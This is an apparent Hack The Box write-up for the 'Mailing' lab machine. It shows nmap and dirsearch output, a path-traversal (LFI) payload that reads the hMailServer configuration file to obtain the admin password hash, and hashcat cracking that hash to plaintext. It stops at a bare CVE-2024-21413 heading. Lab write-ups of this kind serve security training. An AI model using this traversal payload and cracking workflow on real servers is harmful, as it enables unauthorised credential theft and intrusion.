# Mailing Write-up

<img src="https://labs.hackthebox.com/storage/avatars/cedb2f991409f9f39b55b04513f6b102.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap 

`nmap -sC -sV 10.10.11.14`

    PORT    STATE SERVICE       VERSION
    25/tcp  open  smtp          hMailServer smtpd
    | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    80/tcp  open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Did not follow redirect to http://mailing.htb
    110/tcp open  pop3          hMailServer pop3d
    |_pop3-capabilities: UIDL TOP USER
    135/tcp open  msrpc         Microsoft Windows RPC
    139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
    143/tcp open  imap          hMailServer imapd
    |_imap-capabilities: QUOTA SORT RIGHTS=texkA0001 IDLE IMAP4rev1 IMAP4 NAMESPACE completed CHILDREN CAPABILITY OK ACL
    445/tcp open  microsoft-ds?
    465/tcp open  ssl/smtp      hMailServer smtpd
    |_ssl-date: TLS randomness does not represent time
    | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    587/tcp open  smtp          hMailServer smtpd
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    993/tcp open  ssl/imap      hMailServer imapd
    |_ssl-date: TLS randomness does not represent time
    |_imap-capabilities: QUOTA SORT RIGHTS=texkA0001 IDLE IMAP4rev1 IMAP4 NAMESPACE completed CHILDREN CAPABILITY OK ACL
    | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
    | Not valid before: 2024-02-27T18:24:10
    |_Not valid after:  2029-10-06T18:24:10
    Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2024-05-11T10:03:50
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_clock-skew: 1s

Add domain to /etc/hosts

    echo "10.10.11.14 mailing.htb" | sudo tee -a /etc/hosts

mailing.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/ada684d1-c652-4374-9417-6c11a8d7f80e)

### Directory Enumeration with Dirseacrh

`python3 dirsearch.py -e php,html,js -u http://mailing.htb/ --exclude-status 404,403,401,307`

      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    301 -  160B  - /assets  ->  http://mailing.htb/assets/           
    200 -  541B  - /assets/                                          
    200 -   31B  - /download.php                                     

Check `mailing.htb/download.php` 

![image](https://github.com/zer00d4y/writeups/assets/128820441/2123b098-0a7e-46d5-8851-f04a12e6b219)

Now, we can see that the site is vulnerable to LFI, when we add `?file=` parametr in address

![image](https://github.com/zer00d4y/writeups/assets/128820441/a1806eb2-28be-4a5e-8cc4-6a436e51c72d)

Using this payload:

mailing.htb/download.php?file=`../../../Program+Files+(x86)/hmailServer/Bin/hMailServer.INI`

Read the server configuration and find the hash of the admin password 

AdministratorPassword=`841bb5acfa6779ae432fd7a4e6600ba7`

![image](https://github.com/zer00d4y/writeups/assets/128820441/ee523b8b-0287-4a1a-a18c-117b4f3e8886)

## Brute force the hash with hashcat 

`hashcat -a 0 -m 0 hash rockyou.txt`

    841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 0 (MD5)
    Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
    Time.Started.....: Sat May 11 06:42:56 2024 (4 secs)
    Time.Estimated...: Sat May 11 06:43:00 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/home/kali/wordlist/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1631.0 kH/s (0.14ms) @ Accel:256 Loops:1 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 7563264/14344384 (52.73%)
    Rejected.........: 0/7563264 (0.00%)
    Restore.Point....: 7561728/14344384 (52.72%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: homershot -> home379/57
    Hardware.Mon.#1..: Util: 35%

## CVE-2024-21413

